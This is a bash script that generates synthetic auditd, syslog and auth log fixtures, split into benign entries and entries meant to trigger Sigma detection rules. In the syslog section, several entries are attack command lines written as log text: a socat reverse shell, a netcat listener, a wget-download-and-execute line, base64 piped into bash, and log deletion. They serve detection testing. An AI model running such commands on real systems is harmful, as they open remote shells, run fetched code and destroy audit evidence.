#!/usr/bin/env bash
# generate_test_logs.sh
# Generates synthetic auditd, syslog, and auth log test files under testdata/.
# Entries are a mix of benign activity and events that should trigger
# the Sigma rules bundled with this repo.
#
# Usage: bash scripts/generate_test_logs.sh

set -euo pipefail

OUTDIR="testdata"
AUDITD_LOG="$OUTDIR/generated_auditd.log"
SYSLOG_LOG="$OUTDIR/generated_syslog.log"
AUTH_LOG="$OUTDIR/generated_auth.log"

mkdir -p "$OUTDIR"

# ─── Helpers ─────────────────────────────────────────────────────────────────

# Base Unix timestamp — fixed so logs are reproducible
BASE_TS=1700000000
SEQ=1000

auditd_line() {
    local offset="$1"   # seconds offset from BASE_TS
    local type="$2"
    local fields="$3"
    local ts=$(( BASE_TS + offset ))
    echo "type=${type} msg=audit(${ts}.000:${SEQ}): ${fields}"
    SEQ=$(( SEQ + 1 ))
}

syslog_line() {
    local month="$1"
    local day="$2"
    local time="$3"
    local host="$4"
    local proc="$5"
    local msg="$6"
    printf "%s %2s %s %s %s: %s\n" "$month" "$day" "$time" "$host" "$proc" "$msg"
}

# ─── Auditd log ──────────────────────────────────────────────────────────────

cat > "$AUDITD_LOG" << 'HEADER'
# Generated test auditd log
# Lines marked [BENIGN] should produce no detections.
# Lines marked [DETECT] should trigger at least one Sigma rule.
HEADER

echo "" >> "$AUDITD_LOG"
echo "# --- Benign activity ---" >> "$AUDITD_LOG"

# [BENIGN] Normal SSH login
auditd_line 0 "USER_AUTH" \
    'pid=1234 uid=0 auid=4294967295 ses=4294967295 msg='"'"'op=PAM:authentication acct="admin" exe="/usr/sbin/sshd" hostname=10.0.0.5 addr=10.0.0.5 terminal=ssh res=success'"'" \
    >> "$AUDITD_LOG"

# [BENIGN] Normal file open by root
auditd_line 1 "SYSCALL" \
    'arch=c000003e syscall=2 success=yes exit=3 ppid=1 pid=2000 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="cat" exe="/bin/cat" key=(null)' \
    >> "$AUDITD_LOG"

# [BENIGN] Normal cron execution
auditd_line 2 "EXECVE" \
    'argc=1 a0="run-parts" pid=3000 auid=0' \
    >> "$AUDITD_LOG"

# [BENIGN] Normal PATH record for /etc/hosts
auditd_line 3 "PATH" \
    'item=0 name=/etc/hosts inode=123 dev=fd:00 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL' \
    >> "$AUDITD_LOG"

# [BENIGN] Normal systemd service check
auditd_line 4 "SYSCALL" \
    'arch=c000003e syscall=4 success=yes exit=0 ppid=1 pid=2100 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=2 comm="systemctl" exe="/usr/bin/systemctl" key=(null)' \
    >> "$AUDITD_LOG"

echo "" >> "$AUDITD_LOG"
echo "# --- Suspicious activity (should be detected) ---" >> "$AUDITD_LOG"

# [DETECT] lnx_auditd_susp_c2_commands — key=susp_activity (nc executed)
auditd_line 10 "SYSCALL" \
    'arch=c000003e syscall=59 success=yes exit=0 ppid=4500 pid=4501 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts1 ses=3 comm="nc" exe="/bin/nc" key=susp_activity' \
    >> "$AUDITD_LOG"

# [DETECT] lnx_auditd_susp_c2_commands — key=susp_activity (wget executed)
auditd_line 11 "SYSCALL" \
    'arch=c000003e syscall=59 success=yes exit=0 ppid=4500 pid=4502 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts1 ses=3 comm="wget" exe="/usr/bin/wget" key=susp_activity' \
    >> "$AUDITD_LOG"

# [DETECT] lnx_auditd_system_info_discovery — type=EXECVE a0=uname
auditd_line 20 "EXECVE" \
    'argc=2 a0=uname a1=-a pid=5000 auid=1000' \
    >> "$AUDITD_LOG"

# [DETECT] lnx_auditd_system_info_discovery — type=EXECVE a0=hostname
auditd_line 21 "EXECVE" \
    'argc=1 a0=hostname pid=5001 auid=1000' \
    >> "$AUDITD_LOG"

# [DETECT] lnx_auditd_system_info_discovery — type=PATH name=/etc/issue
auditd_line 22 "PATH" \
    'item=0 name=/etc/issue inode=456 dev=fd:00 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL' \
    >> "$AUDITD_LOG"

# [DETECT] lnx_auditd_password_policy_discovery — type=PATH name=/etc/login.defs
auditd_line 30 "PATH" \
    'item=0 name=/etc/login.defs inode=789 dev=fd:00 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL' \
    >> "$AUDITD_LOG"

# [DETECT] lnx_auditd_password_policy_discovery — type=EXECVE a0=chage a1=--list
auditd_line 31 "EXECVE" \
    'argc=3 a0=chage a1=--list a2=root pid=6000 auid=1000' \
    >> "$AUDITD_LOG"

# [DETECT] lnx_auditd_password_policy_discovery — type=EXECVE a0=passwd a1=-S
auditd_line 32 "EXECVE" \
    'argc=2 a0=passwd a1=-S pid=6001 auid=1000' \
    >> "$AUDITD_LOG"

echo "Generated: $AUDITD_LOG"

# ─── Syslog log ──────────────────────────────────────────────────────────────

{
echo "# Generated test syslog log"
echo "# Lines marked [BENIGN] should produce no detections."
echo "# Lines marked [DETECT] should trigger at least one Sigma rule."
echo ""
echo "# --- Benign activity ---"

# [BENIGN] Normal SSH login
syslog_line "Nov" 14 "10:00:01" "webserver" "sshd[1234]" "Accepted publickey for deploy from 10.0.0.5 port 51234 ssh2"

# [BENIGN] Normal sudo usage
syslog_line "Nov" 14 "10:01:00" "webserver" "sudo[2000]" "admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt-get update"

# [BENIGN] Normal cron job
syslog_line "Nov" 14 "10:05:01" "webserver" "cron[3000]" "(root) CMD (/usr/lib/update-notifier/apt-check --human-readable)"

# [BENIGN] Normal service start
syslog_line "Nov" 14 "10:06:00" "webserver" "systemd[1]" "Started OpenBSD Secure Shell server."

# [BENIGN] Normal kernel message
syslog_line "Nov" 14 "10:07:15" "webserver" "kernel" "EXT4-fs (sda1): mounted filesystem with ordered data mode."

echo ""
echo "# --- Suspicious activity (should be detected) ---"

# [DETECT] lnx_syslog_security_tools_disabling_syslog — 'stopping iptables'
syslog_line "Nov" 14 "11:00:01" "webserver" "systemd[1]" "stopping iptables firewall service"

# [DETECT] lnx_syslog_security_tools_disabling_syslog — 'stopping firewalld'
syslog_line "Nov" 14 "11:00:05" "webserver" "systemd[1]" "stopping firewalld dynamic firewall daemon"

# [DETECT] lnx_clear_syslog — 'rm /var/log/syslog'
syslog_line "Nov" 14 "11:05:00" "webserver" "bash[9001]" "rm /var/log/syslog"

# [DETECT] lnx_clear_syslog — 'rm -rf /var/log/syslog'
syslog_line "Nov" 14 "11:05:02" "webserver" "bash[9002]" "rm -rf /var/log/syslog"

# [DETECT] lnx_shell_susp_commands — 'nc -l -p *'
syslog_line "Nov" 14 "11:10:00" "webserver" "bash[9100]" "nc -l -p 4444"

# [DETECT] lnx_shell_susp_commands — 'socat exec:*'
syslog_line "Nov" 14 "11:10:05" "webserver" "bash[9101]" "socat exec:/bin/bash,pty,stderr,setsid tcp:10.0.0.99:4444"

# [DETECT] lnx_shell_susp_commands — 'wget *; chmod +x*'
syslog_line "Nov" 14 "11:15:00" "webserver" "bash[9200]" "wget http://10.0.0.99/shell.sh; chmod +x shell.sh; ./shell.sh"

# [DETECT] lnx_shell_susp_commands — '| base64 -d '
syslog_line "Nov" 14 "11:15:10" "webserver" "bash[9201]" "echo aGVsbG8= | base64 -d | bash"

# [DETECT] lnx_shell_susp_commands — 'chmod +s /tmp/*'
syslog_line "Nov" 14 "11:20:00" "webserver" "bash[9300]" "chmod +s /tmp/rootkit"

} > "$SYSLOG_LOG"

echo "Generated: $SYSLOG_LOG"

# ─── Auth log ─────────────────────────────────────────────────────────────────
# auth.log uses the same syslog format — scan it with:
#   -target syslog -rules ./rules/linux/builtin/sshd/ -file testdata/generated_auth.log

{
echo "# Generated test auth log"
echo "# Lines marked [BENIGN] should produce no detections."
echo "# Lines marked [DETECT] should trigger at least one Sigma rule."
echo ""
echo "# --- Benign activity ---"

# [BENIGN] Successful password auth
syslog_line "Nov" 14 "10:00:01" "server" "sshd[1001]" "Accepted password for alice from 10.0.0.10 port 52345 ssh2"

# [BENIGN] Successful key auth
syslog_line "Nov" 14 "10:00:05" "server" "sshd[1002]" "Accepted publickey for bob from 10.0.0.11 port 52400 ssh2"

# [BENIGN] Normal session open
syslog_line "Nov" 14 "10:00:06" "server" "sshd[1002]" "pam_unix(sshd:session): session opened for user bob by (uid=0)"

# [BENIGN] Failed password (normal brute-force noise, not an exploit attempt)
syslog_line "Nov" 14 "10:01:00" "server" "sshd[1003]" "Failed password for invalid user ftp from 1.2.3.4 port 41234 ssh2"

# [BENIGN] Normal session close
syslog_line "Nov" 14 "10:05:00" "server" "sshd[1002]" "pam_unix(sshd:session): session closed for user bob"

echo ""
echo "# --- Suspicious activity (should be detected) ---"

# [DETECT] lnx_sshd_susp_ssh — 'error in libcrypto' (exploit attempt)
syslog_line "Nov" 14 "11:00:01" "server" "sshd[2001]" "error in libcrypto"

# [DETECT] lnx_sshd_susp_ssh — 'unexpected internal error'
syslog_line "Nov" 14 "11:00:02" "server" "sshd[2002]" "unexpected internal error from 1.2.3.4 port 55123"

# [DETECT] lnx_sshd_susp_ssh — 'bad client public DH value'
syslog_line "Nov" 14 "11:00:03" "server" "sshd[2003]" "bad client public DH value from 1.2.3.4 port 55124"

# [DETECT] lnx_sshd_susp_ssh — 'Corrupted MAC on input'
syslog_line "Nov" 14 "11:00:04" "server" "sshd[2004]" "Corrupted MAC on input"

# [DETECT] lnx_sshd_susp_ssh — 'Local: crc32 compensation attack'
syslog_line "Nov" 14 "11:00:05" "server" "sshd[2005]" "Local: crc32 compensation attack detected"

} > "$AUTH_LOG"

echo "Generated: $AUTH_LOG"

# ─── Summary ─────────────────────────────────────────────────────────────────

cat << 'EOF'

Run against generated logs:

  # Auditd
  go run . -target auditd -rules ./rules/linux/auditd/ -file testdata/generated_auditd.log

  # Syslog
  go run . -target syslog -rules ./rules/linux/builtin/ -file testdata/generated_syslog.log

  # Auth log (uses syslog target + sshd rules)
  go run . -target syslog -rules ./rules/linux/builtin/sshd/ -file testdata/generated_auth.log

  # JSON output
  go run . -target auditd  -rules ./rules/linux/auditd/            -file testdata/generated_auditd.log  -out json
  go run . -target syslog  -rules ./rules/linux/builtin/           -file testdata/generated_syslog.log  -out json
  go run . -target syslog  -rules ./rules/linux/builtin/sshd/      -file testdata/generated_auth.log    -out json

  # Sanity check — benign-only files, expect zero hits
  go run . -target auditd  -rules ./rules/linux/auditd/            -file testdata/auditd.log   -out json
  go run . -target syslog  -rules ./rules/linux/builtin/           -file testdata/syslog.log   -out json

Expected auditd detections:
  - Suspicious C2 Activities          (nc, wget with key=susp_activity)
  - System Information Discovery      (uname, hostname, /etc/issue)
  - Password Policy Discovery         (chage --list, passwd -S, /etc/login.defs)

Expected syslog detections:
  - Disabling Security Tools          (stopping iptables, stopping firewalld)
  - Commands to Clear or Remove Syslog (rm /var/log/syslog)
  - Suspicious Activity in Shell Commands (nc -l -p, socat exec, wget+chmod, base64 -d, chmod +s)

Expected auth log detections:
  - Suspicious OpenSSH Daemon Error   (error in libcrypto, bad DH value, Corrupted MAC, crc32 attack)
EOF
